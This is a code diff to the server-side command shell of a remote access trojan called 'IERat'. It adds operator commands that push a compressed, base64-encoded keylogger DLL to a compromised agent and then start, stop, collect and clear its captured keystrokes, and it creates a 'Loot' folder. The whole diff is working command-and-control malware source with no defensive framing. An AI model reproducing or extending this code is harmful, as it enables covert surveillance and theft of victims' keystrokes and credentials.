@@ -4,15 +4,17 @@ using System.Threading.Tasks;
 using NClap.Metadata;
 using NClap.Repl;
 using IERatServer.lib;
-using IERat.lib;
 using NClap.Utilities;
 using System.Drawing;
 using Console = Colorful.Console;
+using System.IO;
 
 namespace IERatServer
 {
     public class CLI
     {
+        public static string ModulesFolder = Path.Combine(Directory.GetCurrentDirectory(), "Modules");
+        public static string LootFolder = Path.Combine(Directory.GetCurrentDirectory(), "Loot");
         public static LoopInputOutputParameters ioParams = new()
         {
             Prompt = ColoredString.FromString("IERat# ")
@@ -58,6 +60,21 @@ namespace IERatServer
             [Command(typeof(ScreenshotCommand), Description = "Download a file")]
             screenshot,
 
+            [Command(typeof(KeyloggerStartCommand), Description = "Run the keylogger module")]
+            keylogger_start,
+
+            [Command(typeof(KeyLoggerStopCommand), Description = "Stop the keylogger module")]
+            keylogger_stop,
+
+            [Command(typeof(KeyloggerCollectCommand), Description = "Run the keylogger module")]
+            keylogger_collect,
+
+            [Command(typeof(KeyloggerClearCommand), Description = "Run the keylogger module")]
+            keylogger_clear,
+
+            [Command(typeof(ClearCommand), Description = "Clear the console text")]
+            clear,
+
             [Command(typeof(ExitCommand2), Description = "Exits the shell")]
             exit
         }
@@ -73,11 +90,76 @@ namespace IERatServer
             }
         }
 
+        class KeyLoggerStopCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("klog_stop");
+                AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
+                var agent = ActiveChannel.agent;
+                agent.LoadedModules.Remove("klog");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+        class KeyloggerCollectCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("klog_collect");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class KeyloggerClearCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("klog_clear");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class KeyloggerStartCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
+                var agent = ActiveChannel.agent;
+                if (agent.LoadedModules.ContainsKey("klog")) {
+                    AddTaskToActiveAgent("klog_start", "");
+                }
+                else
+                {
+                    try
+                    {
+                        var KlogModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "KeyLogModule.dll"));
+                        AddTaskToActiveAgent("klog_start", Convert.ToBase64String(Actions.Compress(KlogModule)));
+                        agent.LoadedModules.Add("klog", null);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("Error - Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
+                        Logger.Log("error", "Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
+                    }
+                }
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
         class ExitCommand2 : Command
         {
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 Environment.Exit(1);
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class ClearCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                Console.Clear();
                 return Task.FromResult(CommandResult.Success);
             }
         }
@@ -205,6 +287,10 @@ namespace IERatServer
         {
             Console.WriteLine(Figgle.FiggleFonts.CyberLarge.Render("IERat Server"), Color.LightYellow);
             Console.WriteWithGradient("\t\t\t\tPowered by Internet Explorer!\t\n\n", Color.White, Color.LightSkyBlue, 24);
+
+            if (!Directory.Exists(ModulesFolder)) { Directory.CreateDirectory(ModulesFolder); }
+            if (!Directory.Exists(LootFolder)) { Directory.CreateDirectory(LootFolder); }
+
             loop.Execute();
         }
         public static void AddTaskToActiveAgent(string type, string args = "")
